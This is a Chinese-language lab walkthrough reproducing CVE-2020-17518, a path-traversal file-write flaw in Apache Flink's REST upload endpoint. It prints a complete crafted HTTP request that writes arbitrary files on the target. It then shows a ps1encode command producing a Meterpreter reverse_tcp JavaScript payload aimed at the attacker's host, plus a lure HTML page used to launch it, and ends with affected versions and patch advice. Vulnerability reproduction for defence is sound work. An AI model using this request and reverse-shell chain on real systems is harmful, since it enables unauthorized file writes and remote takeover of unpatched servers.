**Apache Flink** **目录遍历漏洞复现(CVE-2020-17518）**

  

![1610178770_5ff960d22ee2a0e270a09.png!small?1610178765065](https://image.3001.net/images/20210109/1610178770_5ff960d22ee2a0e270a09.png!small?1610178765065)

##  **1.** **漏洞复现**

###  **1.1** **漏洞背景**

Apache
Flink是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。近日
Apache官网发布了Apache Flink目录遍历漏洞(CVE-2020-17518)通告，远程攻击者可通过REST
API进行目录遍历，可达到文件读取和写入的效果。

###  **1.2** **漏洞描述**

 **CVE-2020-17518** **：文件写入漏洞**

Apache Flink 1.5.1版本引入了REST API，攻击者可通过恶意修改的HTTP头部将文件写入本地文件系统上的任意位置。

###  **1.3** **漏洞环境搭建**

 **Flink** **安装部署** **-window** **本地部署**

flink 可以运行在 **Linux** , **Mac OS X** , and **Windows** 操作系统上面。要运行Flink得先安装JDK
8.X。本次漏洞复现环境搭建在windows上

JDK安装参看：http://www.itclj.com/blog/5920236681c06e672f942ad4

 **下载**

官网下载地址：https://flink.apache.org/zh/downloads.html

百度盘：https://pan.baidu.com/s/1kmnXBD_5685cvgmsQ7xEbg 提取码:n9bs

 **启动**

将下载好的flink解压，进入bin目录下找到start-cluster.ba，双击运行

![1610178637_5ff9604dd96f5df81a062.png!small?1610178632739](https://image.3001.net/images/20210109/1610178637_5ff9604dd96f5df81a062.png!small?1610178632739)

默认flink开启8081端口，使用<http://you-ip:8081>即可访问

![1610178644_5ff96054b7e02d16f60a5.png!small?1610178639538](https://image.3001.net/images/20210109/1610178644_5ff96054b7e02d16f60a5.png!small?1610178639538)

###  **1.3** **漏洞复现**

本次使用的攻击机：kali ip: 192.168.0.105

靶机：windows 10 x64 ip: 192.168.0.102

将下面payload复制到burpsuit
repeater模块进行发送，就会在flink部署的window主机C盘下的/Users/admin/AppData/Local/Temp/flink-web-c208315e-b746-4692-8281-1d566b1b8c09/flink-web-ui/目录下创建一个success.txt的文件，success.txt写入的内容为success

POST /jars/upload HTTP/1.1

Host: you-ip:8081

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101
Firefox/84.0

Accept: */*

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data;
boundary=---------------------------7953587633284837342617937085

Content-Length: 7302

Origin: http://you-ip:8081

Connection: close

Referer: http://you-ip:8081/

  

\-----------------------------7953587633284837342617937085

Content-Disposition: form-data; name="jarfile";
filename="/Users/admin/AppData/Local/Temp/flink-web-c208315e-b746-4692-8281-1d566b1b8c09/flink-web-ui/success.txt"

Content-Type: application/octet-stream

Success

\-----------------------------7953587633284837342617937085—

![1610178674_5ff960724cdaf8851bc02.png!small?1610178669085](https://image.3001.net/images/20210109/1610178674_5ff960724cdaf8851bc02.png!small?1610178669085)

可以看到成功创建了文件success.txt 文件

![1610178682_5ff9607acc65f9554f448.png!small?1610178677588](https://image.3001.net/images/20210109/1610178682_5ff9607acc65f9554f448.png!small?1610178677588)

###  **1.4** **通过写入** **js** **文件来反弹** **shell**

1、首先通过ps1encode工具生成反弹shell的js脚本，ps1encode工具下载地址为：git clone
https://github.com/CroweCybersecurity/ps1encode.git

2、进入ps1encode目录，使用./ps1encode.rb --LHOST 192.168.0.105 --LPORT 4444 --PAYLOAD
windows/meterpreter/reverse_tcp --ENCODE cmd -t js 命令生成payload

![1610178691_5ff96083881ebea98df05.png!small?1610178686359](https://image.3001.net/images/20210109/1610178691_5ff96083881ebea98df05.png!small?1610178686359)

3、将生成的payload复制到burpsuit中，修改写入文件名为success.js 发送

![1610178707_5ff96093685911a69a341.png!small?1610178702196](https://image.3001.net/images/20210109/1610178707_5ff96093685911a69a341.png!small?1610178702196)

4、可以看到成功在flink部署的window主机上创建了succes.js文件

![1610178713_5ff960995cd92dfd5d880.png!small?1610178708221](https://image.3001.net/images/20210109/1610178713_5ff960995cd92dfd5d880.png!small?1610178708221)

5、windows执行文件

直接执行的话可能比较明显，所以参照文章我们写了一个success.html文件，内容如下

<html>

<title>这是一个惊喜</title>

<body>

<img src ='1.jpg'>

<script type="text/javascript" src="success.js"></script>

</body>

</html>

6、执行success.html文件，选择运行->允许阻止内容->选择是，就反弹成功了

![1610179122_5ff9623201166a53fff99.png!small?1610179116808](https://image.3001.net/images/20210109/1610179122_5ff9623201166a53fff99.png!small?1610179116808)

![1610179115_5ff9622bf297c9746dd05.png!small?1610179110787](https://image.3001.net/images/20210109/1610179115_5ff9622bf297c9746dd05.png!small?1610179110787)

7、获取shell

使用msf监听

![1610179503_5ff963af69afbfb3ef68d.png!small?1610179498188](https://image.3001.net/images/20210109/1610179503_5ff963af69afbfb3ef68d.png!small?1610179498188)

目前反弹shell能建立连接，但是无法执行命令，不知道什么原因

![1610179110_5ff962266b80a4c63655d.png!small?1610179105415](https://image.3001.net/images/20210109/1610179110_5ff962266b80a4c63655d.png!small?1610179105415)

## 2\. **影响范围**

 **CVE-2020-17518:**

Apache Flink 1.5.1 - 1.11.2

##  **3.** **严重等级**

高危

##  **4.** **处置方法**

###  **4.1** **官方补丁**

Apache Flink 官方已在新版本中修复此漏洞，请升级至Flink
1.11.3或1.12.0，下载链接：https://flink.apache.org/downloads.html

